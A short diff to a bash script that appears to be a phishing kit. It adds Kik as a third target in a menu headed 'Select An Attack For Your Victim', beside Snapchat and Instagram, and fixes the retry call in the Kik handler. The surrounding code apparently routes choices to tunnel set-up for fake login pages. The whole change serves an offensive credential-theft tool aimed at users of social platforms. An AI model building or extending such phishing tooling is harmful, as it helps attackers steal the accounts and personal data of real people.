@@ -350,7 +350,7 @@ site_kik() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_instagram; }
+		{ sleep 1; clear; banner_small; site_kik; }
 	fi
 }
 
@@ -361,6 +361,7 @@ main_menu() {
 		${RED}[${WHITE}::${RED}]${GREEN} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${GREEN}
 		${RED}[${WHITE}01${RED}]${CYAN} Snapchat
 		${RED}[${WHITE}02${RED}]${CYAN} Instagram
+		${RED}[${WHITE}03${RED}]${CYAN} Kik
 		${RED}[${WHITE}99${RED}]${CYAN} About
 		${RED}[${WHITE}00${RED}]${CYAN} Exit
 	EOF
@@ -371,6 +372,8 @@ main_menu() {
 		site_sc
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		site_instagram
+	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+		site_kik
 	elif [[ "$REPLY" == 99 ]]; then
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
